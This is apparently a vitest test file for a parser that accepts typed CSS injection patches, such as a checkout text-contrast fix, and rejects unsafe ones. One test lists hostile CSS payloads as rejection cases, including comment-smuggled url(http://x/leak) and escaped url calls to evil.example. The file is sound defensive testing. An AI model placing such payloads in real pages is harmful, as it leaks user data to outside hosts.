import { describe, expect, it } from "vitest";
import { hashKey, parsePatchSpec } from "../../runtime/patch-rules.js";
import { emitCssNumber, serializeCss } from "../../runtime/css-typed.js";
import { CSS_ATTACKS, CSS_TYPED_ACCEPTED, colorCss } from "../fixtures/patch-spec-corpus.ts";

describe("typed injectCSS", () => {
  it("serializes the checkout contrast rule without !important or free text", () => {
    const parsed = parsePatchSpec({
      id: "css",
      version: 0,
      ops: [
        {
          op: "injectCSS",
          rules: [
            {
              selector: { tag: "p", classes: ["terms", "contrast-fail"] },
              declarations: [
                { property: "color", value: "#111" },
                { property: "background-color", value: "#fff" },
              ],
            },
          ],
        },
      ],
    });
    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    const css = (parsed.spec.ops[0] as { css: string }).css;
    expect(css).toBe("p.terms.contrast-fail { color: #111111; background-color: #ffffff; }");
    expect(css.includes("!important")).toBe(false);
    expect(css.includes("url(")).toBe(false);
    expect(css.includes("/*")).toBe(false);
  });

  it("rejects every CSS attack fixture including round-4 bypass payloads", () => {
    for (const attack of CSS_ATTACKS) {
      const parsed = parsePatchSpec(attack.spec);
      expect(parsed.ok, attack.name).toBe(false);
    }
  });

  it("must-reject comment smuggling, u\\72l(, #fff0, rgb slash-alpha, outline 3000px, bare types", () => {
    const payloads = [
      { op: "injectCSS", css: 'h1{color:"/*"; background-image:url(http://x/leak) /* */}' },
      {
        op: "injectCSS",
        rules: [
          {
            selector: { classes: ["x"] },
            declarations: [{ property: "color", value: "u\\72l(http://evil.example)" }],
          },
        ],
      },
      {
        op: "injectCSS",
        rules: [{ selector: { classes: ["x"] }, declarations: [{ property: "color", value: "#fff0" }] }],
      },
      {
        op: "injectCSS",
        rules: [
          {
            selector: { classes: ["x"] },
            declarations: [{ property: "color", value: "rgb(0 0 0 / 0)" }],
          },
        ],
      },
      {
        op: "injectCSS",
        rules: [
          {
            selector: { classes: ["x"] },
            declarations: [{ property: "outline", value: "3000px" }],
          },
        ],
      },
      {
        op: "injectCSS",
        rules: [
          {
            selector: { tag: "p" },
            declarations: [{ property: "color", value: "#111" }],
          },
        ],
      },
    ];
    for (const payload of payloads) {
      expect(parsePatchSpec({ id: "atk", version: 0, ops: [payload] }).ok).toBe(false);
    }
  });

  it("never emits !important and re-emits parsed values", () => {
    const css = serializeCss([
      {
        selector: { classes: ["x"] },
        declarations: [{ property: "color", value: "#111111" }],
      },
    ]);
    expect(css).toBe(".x { color: #111111; }");
    expect(parsePatchSpec({ id: "ok", version: 0, ops: [colorCss()] }).ok).toBe(true);
    for (const item of CSS_TYPED_ACCEPTED) {
      expect(
        parsePatchSpec({ id: item.name, version: 0, ops: [{ op: "injectCSS", rules: item.rules }] }).ok,
        item.name,
      ).toBe(true);
    }
  });

  it("re-emits numbers without exponent and uses a 64-bit css key hash", () => {
    expect(emitCssNumber(12)).toBe("12");
    expect(emitCssNumber(1.25)).toBe("1.25");
    expect(emitCssNumber(0.75)).toBe("0.75");
    expect(emitCssNumber(Number.POSITIVE_INFINITY)).toBeNull();
    expect(hashKey("x")).toMatch(/^[0-9a-f]{16}$/);
    expect(hashKey("x")).not.toBe(hashKey("y"));
  });

  it("rejects matching color and background at parse time", () => {
    expect(
      parsePatchSpec({
        id: "eq",
        version: 0,
        ops: [
          {
            op: "injectCSS",
            rules: [
              {
                selector: { classes: ["x"] },
                declarations: [
                  { property: "color", value: "#fff" },
                  { property: "background-color", value: "#fff" },
                ],
              },
            ],
          },
        ],
      }).ok,
    ).toBe(false);
  });
});
